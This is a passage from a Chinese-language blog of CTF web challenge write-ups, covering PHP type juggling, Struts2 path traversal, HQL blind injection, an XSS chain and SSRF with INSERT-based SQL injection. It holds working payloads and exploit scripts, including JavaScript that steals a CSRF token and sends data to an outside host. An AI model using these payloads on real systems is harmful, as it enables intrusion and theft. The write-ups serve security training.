    $result = False;
    die();
}
if(!$result) die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);
if($result){
    echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;
    echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;
    $_SESSION['admin'] = True;
}
?&gt;
</code></pre>
<p>从URL获取一个id参数 , 这个id参数要满足不为 '1', 且最后一位为 '9'. 当通过这个判断后, 将其带入数据库操作, 如果返回的结果不为空, 那么将会设置 <code>$_SESSION['admin'] = True</code>. 第一反应是 SQLi，虽然使用 <code>mysql_real_escape_string()</code> 转义了SQL语句中的特殊字符，如果目标站点使用 GBK 编码，则可能可以通过宽字节注入来绕过。</p>
<figure data-type="image" tabindex="26"><img src="https://3nd.xyz/post-images/move/20190916190329.png" alt="" loading="lazy"></figure>
<p>留意到<code>floatval()</code>函数, floatval() 函数用于获取变量的浮点值, 返回浮点值则这里的<code>floatval($_GET[id]) !== '1'</code>永真，且floatval()在碰到特殊字符时会<strong>截断</strong>后面的部分(如空格等)，则设置 <code>id=1%209</code>即可查询到 <code>id=1</code> 的 admin。</p>
<figure data-type="image" tabindex="27"><img src="https://3nd.xyz/post-images/move/20190916195254.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="28"><img src="https://3nd.xyz/post-images/move/20190916195354.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="29"><img src="https://3nd.xyz/post-images/move/20190916195540.png" alt="" loading="lazy"></figure>
<h2 id="0x0c-lottery">0x0C lottery</h2>
<p>XCTF 4th-QCTF-2018</p>
<p>People are winning fabulous prizes every day. You could win up to $5000000!</p>
<ul>
<li>
<p>PHP弱类型比较</p>
</li>
<li>
<p>GitHack</p>
</li>
</ul>
<p>首先访问<code>robots.txt</code>/<code>.git</code>返现 Git 仓库可使用 GitHack 拿到源码。</p>
<p>问题出现在 <code>api.php</code> 的 <code>buy()</code>:</p>
<pre><code class="language-php">function buy($req){
	require_registered();
	require_min_money(2);

	$money = $_SESSION['money'];
	$numbers = $req['numbers'];
    $win_numbers = random_win_nums();
    for($i=0; $i&lt;7; $i++){
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
    [...]
}
</code></pre>
<p><code>$numbers</code> 来自用户输入：</p>
<pre><code class="language-json">{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1111111&quot;}
</code></pre>
<p>与 <code>$win_numbers</code> 进行比较，未进行数据类型检验与过滤，由于 for 循环内进行的是 <code>==</code> PHP 弱类型比较，我们可以构造出如下 payload:</p>
<pre><code class="language-json">{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true, true, true, true, true, true, true]}
</code></pre>
<p>进行重放 获取足够的 $ 购买 flag 即可：</p>
<figure data-type="image" tabindex="30"><img src="https://3nd.xyz/post-images/move/20190925220150.png" alt="" loading="lazy"></figure>
<p>获取到 flag 如下:</p>
<pre><code class="language-json">{&quot;status&quot;:&quot;ok&quot;,&quot;msg&quot;:&quot;Here is your flag: cyberpeace{d1614926fe8edc22fc054ef0c7562504}&quot;,&quot;money&quot;:410310}
</code></pre>
<h2 id="0x0d-zhuanxv">0x0D Zhuanxv</h2>
<p>XCTF 4th-SCTF-2018 你只是在扫描目标端口的时候发现了一个开放的web服务</p>
<figure data-type="image" tabindex="31"><img src="https://3nd.xyz/post-images/move/20191002095046.png" alt="" loading="lazy"></figure>
<p>在 Github 上搜索到<a href="https://github.com/Lazyboxx/zhuanxvapplication">相关项目</a>，后台路由为 <code>/zhuanxvlogin</code>：</p>
<figure data-type="image" tabindex="32"><img src="https://3nd.xyz/post-images/move/20191002095404.png" alt="" loading="lazy"></figure>
<p>通过 Burp 抓包获取到如下图片读取接口：</p>
<figure data-type="image" tabindex="33"><img src="https://3nd.xyz/post-images/move/20191002095633.png" alt="" loading="lazy"></figure>
<p>猜测为 Java 编写，尝试读取配置文件 <code>../../WEB-INF/web.xml</code> ：</p>
<figure data-type="image" tabindex="34"><img src="https://3nd.xyz/post-images/move/20191002095836.png" alt="" loading="lazy"></figure>
<p>发现为 Struct2 框架，获取 class 文件路径：</p>
<figure data-type="image" tabindex="35"><img src="https://3nd.xyz/post-images/move/20191002101308.png" alt="" loading="lazy"></figure>
<p>同时在 <code>user.hbm.xml</code> 获取到 flag 存储的表名和列名：</p>
<figure data-type="image" tabindex="36"><img src="https://3nd.xyz/post-images/move/20191002103011.png" alt="" loading="lazy"></figure>
<ul>
<li>UserServiceImpl.class</li>
</ul>
<pre><code class="language-java">/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class
</code></pre>
<p>通过 <code>JD-GUI</code> 即可反编译 <code>.class</code> 文件获取源码：</p>
<figure data-type="image" tabindex="37"><img src="https://3nd.xyz/post-images/move/20191002102245.png" alt="" loading="lazy"></figure>
<pre><code class="language-java">public class UserServiceImpl implements UserService {
  private UserDao userDao;
  public UserDao gerUserDao() { return this.userDao; }
  public void setUserDao(UserDao userDao) { this.userDao = userDao; }
  public List&lt;User&gt; findUserByName(String name) { return this.userDao.findUserByName(name); }
  
  public List&lt;User&gt; loginCheck(String name, String password) {
    name = name.replaceAll(&quot; &quot;, &quot;&quot;);
    name = name.replaceAll(&quot;=&quot;, &quot;&quot;);
    Matcher username_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(name);
    Matcher password_matcher = Pattern.compile(&quot;^[0-9a-zA-Z]+$&quot;).matcher(password);
    if (password_matcher.find()) {
      return this.userDao.loginCheck(name, password);
    }
    return null;
  }
}
</code></pre>
<p>HQL 过滤了空格和等号，可用换行符号 <code>%0a</code> 代替。</p>
<ul>
<li>UserDaoImpl.class</li>
</ul>
<pre><code class="language-java">/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class
</code></pre>
<pre><code class="language-java">public class UserDaoImpl extends HibernateDaoSupport implements UserDao {
  public List&lt;User&gt; findUserByName(String name) { 
      return getHibernateTemplate().find(&quot;from User where name ='&quot; + name + &quot;'&quot;); 
    }
  public List&lt;User&gt; loginCheck(String name, String password) { 
      return getHibernateTemplate().find(&quot;from User where name ='&quot; + name + &quot;' and password = '&quot; + password + &quot;'&quot;); 
    }
}
</code></pre>
<p>构造 payload ，获取 admin 权限：</p>
<pre><code class="language-java">/zhuanxvlogin?user.name=admin%27%0Aor%0A%271%27%3E%270'%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1
</code></pre>
<p>构造 exp 如下，通过盲注获取flag：</p>
<pre><code class="language-python">import requests
r = requests.session()
flag = ''
for i in range(1,50):
    p = ''
    for j in range(1, 255):
        payload = &quot;(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;'&quot;+str(j)+&quot;'&quot;
        url=&quot;http://111.198.29.45:49524/zhuanxvlogin?user.name=admin'%0Aor%0A&quot;+payload+&quot;%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1&quot;
        r1 = r.get(url)
        if len(r1.text) &gt; 20000 and p != '':
            flag += p
            print i, flag
            break
        p = chr(j)
</code></pre>
<p>获取到 sctf{C46E250926A2DFFD831975396222B08E}。</p>
<ul>
<li>*<code>Spring</code> 框架下常用的配置文件:</li>
</ul>
<pre><code class="language-java">/WEB-INF/classes/Struts.xml
/WEB-INF/web.xml

/WEB-INF/classes/applicationContext.xml     
    1. 存有jdbc数据库账号密码  
        &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;

    2. 数据库类型,表名,位置 
        &lt;property name=&quot;mappingLocations&quot;&gt;
            &lt;value&gt;user.hbm.xml&lt;/value&gt;
            ...

    3. 得知类名
            &lt;bean id=&quot;userService&quot; class=&quot;com.cuitctf.service.impl.UserServiceImpl&quot;&gt;
            &lt;property name=&quot;userDao&quot;&gt;
              &lt;ref bean=&quot;userDAO&quot;/&gt;
            ...
</code></pre>
<h2 id="0x0e-website">0x0E Website</h2>
<p>[HITB CTF Singapore 2017] Web 434 – Website</p>
<figure data-type="image" tabindex="38"><img src="https://3nd.xyz/post-images/move/20191002155816.png" alt="" loading="lazy"></figure>
<p>存在多处 XSS，waf 不严格。思路：提交链接 -&gt; admin check -&gt; admin(&amp;csrftoken) get flag.</p>
<pre><code class="language-bash">恶意链接 -&gt; 302 jsonp xss -&gt; 提取csrftoken -&gt; xhr 控制读取 flag -&gt; 接收 flag
</code></pre>
<p>提交链接 <code>http://endl.me/xss</code>:</p>
<ul>
<li>index.php</li>
</ul>
<pre><code class="language-php">&lt;?php 
header(&quot;Location:http://111.198.29.45:59794/action.php?callback=&lt;script src=\&quot;//endl.me/xss/website.js\&quot;&gt;&lt;/script&gt;&quot;);
?&gt;
</code></pre>
<ul>
<li>website.js</li>
</ul>
<pre><code class="language-js">html = document.head.innerHTML;
function request(url)
{
    img = document.createElement(&quot;img&quot;);
    img.width = &quot;1px&quot;;
    img.height = &quot;1px&quot;;
    img.src = url;
    document.body.appendChild(img);
}
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( &quot;GET&quot;, theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
function myfunc()
{
    html = document.body.innerHTML;
    i = html.indexOf(&quot;token&quot;);
    j = html.indexOf(&quot;','erro&quot;);
    token = html.slice(i+8,j);
    request(domain+btoa(token));
    flag = httpGet(&quot;http://111.198.29.45:47495/getflag.php?csrftoken=&quot;+token);
    request(domain+btoa(flag));
}
domain = &quot;http://endl.me/&quot;;
setTimeout(myfunc, 2000);
</code></pre>
<p>获取到 HITB{j50nP_1s_VulN3r4bLe}.</p>
<p>另一种解法，在 fuzz 中发现一个有趣的路由如下：</p>
<pre><code class="language-php">/action.php?callback=getInfo
</code></pre>
<p>callback 参数可控，payload如下：</p>
<pre><code class="language-js">/action.php?callback=%3Chtml%3E%3Cbody%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//cdn.bootcss.com/jquery/3.1.1/jquery.min.js%22%3E%3C/script%3E%00%00%00%00%00%00%00%3Cscript%20src=%22//endl.me/xss/test.js%22%3E%3C/script%3E%3Cdiv%3E
</code></pre>
<ul>
<li>test.js</li>
</ul>
<pre><code class="language-js">window.onload = function () {
    var a = document.getElementsByTagName('div')[0],
        data = eval(a.innerHTML);
    $.get(&quot;getflag.php&quot;, {
        csrftoken: data['csrftoken']
        }, function (data, status) {
        feedback(data);
    });
}

function feedback(data) {
    var data = encodeURIComponent(data),
        img = document.createElement('img');
    img.src = 'https://endl.me/xss/?`' + data;
    console.log(img);
    document.body.appendChild(img);
}
</code></pre>
<figure data-type="image" tabindex="39"><img src="https://3nd.xyz/post-images/move/20191005112856.png" alt="" loading="lazy"></figure>
<h2 id="0x10-ics-02">0x10 ics-02</h2>
<p>XCTF 4th-CyberEarth 工控云管理系统的文档中心页面，存在不易被发现的漏洞。</p>
<ul>
<li>SSRF + INSERT SQLi</li>
</ul>
<p>通过 <code>download.php?dl=</code> 处 dl 参数进行 SSRF 攻击 <code>/secret/secret_debug.php</code> 进行 SQLi 获取 flag。</p>
<p>MYSQL Demo:</p>
<pre><code class="language-sql">mysql&gt; create table ics02(A VARCHAR(255) NOT NULL UNIQUE, B VARCHAR(255) NOT NULL, C VARCHAR(255) NOT NULL, D VARCHAR(255) NOT NULL);
Query OK, 0 rows affected (0.05 sec)

mysql&gt; DESC ics02;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| A     | varchar(255) | NO   | PRI | NULL    |       |
| B     | varchar(255) | NO   |     | NULL    |       |
| C     | varchar(255) | NO   |     | NULL    |       |
| D     | varchar(255) | NO   |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)

mysql&gt; INSERT INTO ics02 (A,B,C,D) VALUES ('a','b','c','d');
Query OK, 1 row affected (0.01 sec)

mysql&gt; select * from ics02;
+---+---+---+---+
| A | B | C | D |
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
1 row in set (0.00 sec)

mysql&gt; INSERT INTO ics02 (A,B,C,D) VALUES ('q',version()/*,'b'*/,'c','d');
Query OK, 1 row affected (0.00 sec)

mysql&gt; select * from ics02;
+---+--------+---+---+
| A | B      | C | D |
+---+--------+---+---+
| a | b      | c | d |
| q | 8.0.17 | c | d |
+---+--------+---+---+
2 rows in set (0.00 sec)
</code></pre>
<p>Payload:</p>
<pre><code class="language-python">import random
import requests
from urllib import urlencode

# url SSRF attack secret_debug.php IP: 127.0.0.1
url = &quot;http://127.0.0.1/secret/secret_debug.php?&quot;

# Payload
# payload = &quot;version()&quot; 
# 5.5.62-0ubuntu0.14.04.1
# payload = &quot;database()&quot; 
# ssrfw
# payload = &quot;SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema)='ssrfw'&quot;
# cetcYssrf,users,
# payload = &quot;SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name)='cetcYssrf'&quot;
# secretName,value,
payload = &quot;SELECT(GROUP_CONCAT(secretName,0x3a,value))FROM(ssrfw.cetcYssrf)&quot;
# flag:flag{cpg9ssnu_OOOOe333eetc_2018}

# Duplicate entry '12' for key 'licenceNumber'
# make sure Indetification Number different 
randstr = random.getrandbits(16)

# GET params
data = (url + urlencode({
            &quot;s&quot;:&quot;3&quot;,
            &quot;txtfirst_name&quot;: &quot;A','B',(&quot; + payload + &quot;),'D'/*&quot;,
            &quot;txtmiddle_name&quot;: &quot;B&quot;,
            &quot;txtname_suffix&quot;: &quot;C&quot;,
            &quot;txtLast_name&quot;: &quot;D&quot;,
            'txtdob': &quot;*/,'E&quot;,
            'txtdl_nmbr': randstr,
            'txtRetypeDL': randstr,
            'btnContinue2': &quot;Continue&quot;
            })
        )

print(data)
</code></pre>
<figure data-type="image" tabindex="40"><img src="https://3nd.xyz/post-images/move/20191006000147.png" alt="" loading="lazy"></figure>
<p><strong>- 参考链接 -</strong></p>
<ol>
<li>
<p><a href="http://wonderkun.cc/index.html/?p=670">PHP的libcurl中存在的一些问题</a></p>
</li>
<li>
<p><a href="http://www.guildhab.top/?p=481">Web-(ics-05/ics-07)-WriteUp</a></p>
</li>
<li>
<p><a href="http://www.guildhab.top/?p=708">Web-ics-02-WriteUp</a></p>
</li>
</ol>

                  </div>
                  <div class="toc-container">
                    <div style="position: sticky;
                    top: 20px;">
                    <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-cat">0x01 Cat</a></li>
<li><a href="#0x02-ics-05">0x02 ics-05</a></li>
<li><a href="#0x03-newscenter">0x03 NewsCenter</a></li>
<li><a href="#0x04-nannannannan-batman">0x04 NaNNaNNaNNaN-Batman</a></li>
<li><a href="#0x05-upload">0x05 upload</a></li>
<li><a href="#0x06-php2">0x06 PHP2</a></li>
<li><a href="#0x07-bug">0x07 BUG</a></li>
<li><a href="#0x08-web2">0x08 web2</a></li>
<li><a href="#0x09-wtfsh-150">0x09 wtf.sh-150</a></li>
<li><a href="#0x0a-i-got-id-200">0x0A i-got-id-200</a></li>
<li><a href="#0x0b-ics-07">0X0B ics-07</a></li>
<li><a href="#0x0c-lottery">0x0C lottery</a></li>
<li><a href="#0x0d-zhuanxv">0x0D Zhuanxv</a></li>
<li><a href="#0x0e-website">0x0E Website</a></li>
<li><a href="#0x10-ics-02">0x10 ics-02</a></li>
</ul>
</li>
</ul>

                  </div>
                  </div>
                </div>
          </article>
        </div>

        
          <div class="nearby-post" style="padding: 24px 32px;">
            <div class="prev-post" style="float: left;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter;text-align: left;">上一篇</div>
              <a href="https://3nd.xyz/post/2019-09-14-file-operation-unserialization-via-phar/">
                <h3 class="post-title" style="text-align: left;">
                  利用 phar 拓展 PHP 反序列化攻击面
                </h3>
              </a>
            </div>
            <div class="next-posts" style="float: right;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter; text-align: right;">下一篇</div>
              <a href="https://3nd.xyz/post/2019-09-10-Javascript-Prototype-Attack/">
                <h3 class="post-title" style="
                text-align: right;">
                  Javascript 原型链污染攻击学习
                </h3>
              </a>
            </div>
          </div>
          

                

                                <div class="site-footer">
  
  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

    </div>
  </div>

  <script>
    hljs.highlightAll();

    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

    // This should probably be throttled.
    // Especially because it triggers during smooth scrolling.
    // https://lodash.com/docs/4.17.10#throttle
    // You could do like...
    // window.addEventListener("scroll", () => {
    //    _.throttle(doThatStuff, 100);
    // });
    // Only not doing it here to keep this Pen dependency-free.

    window.addEventListener("scroll", event => {
      let fromTop = window.scrollY;

      mainNavLinks.forEach((link, index) => {
        let section = document.getElementById(decodeURI(link.hash).substring(1));
        let nextSection = null
        if (mainNavLinks[index + 1]) {
          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
        }
        if (section.offsetTop <= fromTop) {
          if (nextSection) {
            if (nextSection.offsetTop > fromTop) {
              link.classList.add("current");
            } else {
              link.classList.remove("current");
            }
          } else {
            link.classList.add("current");
          }
        } else {
          link.classList.remove("current");
        }
      });
    });
  </script>
<script src="/media/view-support.js"></script>
<script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
    var pageview = window.pageview(AV, {
      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
      appClass: 'Gridea',
    });
    $('.page-view').each(function () {
      var $this = $(this);
      var key = $this.attr('key');
      var title = $this.attr('title');
      pageview.increase(key, title, function(view) {
        $("[key='" + key +"']").text(view+' views');
      });
    });
  });
</script>

</body>

</html>